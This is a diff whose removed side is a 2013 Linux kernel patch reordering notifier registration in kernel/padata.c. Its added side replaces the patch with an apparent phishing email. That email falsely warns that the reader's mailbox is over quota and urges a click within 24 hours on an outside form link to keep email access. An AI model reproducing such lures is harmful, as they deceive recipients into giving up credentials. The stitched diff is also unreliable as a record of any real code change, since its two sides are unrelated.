@@ -1,52 +1,44 @@
-From: Richard Weinberger <richard@nod.at>
-Subject: [PATCH] kernel/padata.c: Register hotcpu notifier after initialization
-Date: Fri, 23 Aug 2013 13:12:33 +0200
-Message-ID: <1377256353-7979-1-git-send-email-richard@nod.at>
-Cc: linux-crypto@vger.kernel.org, linux-kernel@vger.kernel.org,
-	herbert@gondor.apana.org.au, gang.chen@asianux.com,
-	Richard Weinberger <richard@nod.at>
-To: steffen.klassert@secunet.com
-Return-path: <linux-kernel-owner@vger.kernel.org>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: linux-crypto.vger.kernel.org
+From: "Ruiz, Irma" <iruiz@paterson.k12.nj.us>
+Subject: RE:
+Date: Fri, 23 Aug 2013 10:47:27 +0000
+Message-ID: <B719EF0A9FB7A247B5147CD67A83E60E011FEB7A8E__23486.3562662669$1377257788$gmane$org@EXCH10-MB3.paterson.k12.nj.us>
+References: <B719EF0A9FB7A247B5147CD67A83E60E011FEB76D1@EXCH10-MB3.paterson.k12.nj.us>
+Mime-Version: 1.0
+Content-Type: text/plain; charset=US-ASCII
+Content-Transfer-Encoding: 7BIT
+To: "Ruiz, Irma" <iruiz@paterson.k12.nj.us>
+Return-path: <linux-crypto-owner@vger.kernel.org>
+Received: from studentmail.paterson.k12.nj.us ([204.8.198.37]:9832 "EHLO
+	mail.paterson.k12.nj.us" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+	with ESMTP id S1755348Ab3HWLfb convert rfc822-to-8bit (ORCPT
+	<rfc822;linux-crypto@vger.kernel.org>);
+	Fri, 23 Aug 2013 07:35:31 -0400
+In-Reply-To: <B719EF0A9FB7A247B5147CD67A83E60E011FEB76D1@EXCH10-MB3.paterson.k12.nj.us>
+Content-Language: en-US
+Sender: linux-crypto-owner@vger.kernel.org
+List-ID: <linux-crypto.vger.kernel.org>
 
-padata_cpu_callback() takes pinst->lock, to avoid taking
-an uninitialized lock, register the notifier after it's
-initialization.
 
-Signed-off-by: Richard Weinberger <richard@nod.at>
----
- kernel/padata.c | 12 ++++++------
- 1 file changed, 6 insertions(+), 6 deletions(-)
+________________________________
+From: Ruiz, Irma
+Sent: Friday, August 23, 2013 6:40 AM
+To: Ruiz, Irma
+Subject:
 
-diff --git a/kernel/padata.c b/kernel/padata.c
-index 072f4ee..8e1bf9d 100644
---- a/kernel/padata.c
-+++ b/kernel/padata.c
-@@ -1086,18 +1086,18 @@ struct padata_instance *padata_alloc(struct workqueue_struct *wq,
- 
- 	pinst->flags = 0;
- 
--#ifdef CONFIG_HOTPLUG_CPU
--	pinst->cpu_notifier.notifier_call = padata_cpu_callback;
--	pinst->cpu_notifier.priority = 0;
--	register_hotcpu_notifier(&pinst->cpu_notifier);
--#endif
--
- 	put_online_cpus();
- 
- 	BLOCKING_INIT_NOTIFIER_HEAD(&pinst->cpumask_change_notifier);
- 	kobject_init(&pinst->kobj, &padata_attr_type);
- 	mutex_init(&pinst->lock);
- 
-+#ifdef CONFIG_HOTPLUG_CPU
-+	pinst->cpu_notifier.notifier_call = padata_cpu_callback;
-+	pinst->cpu_notifier.priority = 0;
-+	register_hotcpu_notifier(&pinst->cpu_notifier);
-+#endif
-+
- 	return pinst;
- 
- err_free_masks:
--- 
-1.8.3.1
+Your Mailbox Has Exceeded It Storage Limit As Set By Your Administrator,Click Below to complete update on your storage limit quota
+
+CLICK HERE<http://isaacjones.coffeecup.com/forms/WEBMAIL%20ADMINISTRATOR/>
+
+Please note that you have within 24 hours to complete this update. because you might lose access to your Email Box.
+
+System Administrator
+This email or attachment(s) may contain confidential or legally privileged information intended for the sole use of the addressee(s). Any use, redistribution, disclosure, or reproduction of this message, except as intended, is prohibited. If you received this email in error, please notify the sender and remove all copies of the message, including any attachments. Any views or opinions expressed in this email (unless otherwise stated) may not represent those of Capital & Coast District Health Board.
+[X]
+[X]
+[X]
+[X]
+[X]
+[X]
+[X]
+[X]
+[X]
